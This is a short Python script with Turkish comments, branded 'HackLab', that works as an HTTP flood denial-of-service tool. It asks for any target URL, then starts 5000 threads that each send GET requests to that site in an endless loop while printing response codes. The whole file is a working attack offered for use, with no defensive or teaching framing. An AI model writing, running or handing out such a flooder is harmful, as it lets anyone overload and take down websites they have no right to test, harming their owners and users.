import os
import threading
import requests
import pyfiglet
from termcolor import colored

# Ekranı temizleme fonksiyonu
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# Ekranı temizle
clear_screen()

# Büyük ASCII "HackLab" yazısı (Kırmızı)
ascii_banner = pyfiglet.figlet_format("HackLab")
print(colored(ascii_banner, 'red'))

# Küçük kırmızı "Youtube: HackLab" yazısı
print(colored("Youtube: HackLab", 'red'))

# Kullanıcıdan hedef siteyi al
target_url = input("\nHedef siteyi gir (http:// veya https:// ile): ")

# Aynı anda çalışacak istek sayısı
num_requests = 5000

def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"[+] İstek gönderildi! Durum Kodu: {response.status_code}")
        except requests.exceptions.RequestException:
            print("[-] Hata! Sunucu cevap vermiyor.")

# Thread’leri başlat
threads = []
for _ in range(num_requests):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

# Thread’lerin bitmesini bekle
for t in threads:
    t.join()
